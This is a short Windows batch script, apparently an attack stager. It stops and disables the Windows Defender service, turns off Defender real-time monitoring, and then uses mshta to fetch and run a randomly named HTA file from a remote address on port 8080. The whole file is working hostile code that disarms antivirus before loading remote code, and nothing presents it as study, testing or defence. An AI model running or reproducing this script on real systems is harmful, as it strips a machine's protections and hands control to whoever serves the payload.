@echo off
sc stop WinDefend
sc config WinDefend start= disabled
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
mshta http://192.168.0.163:8080/hRR9QvEU1e4cGS.hta

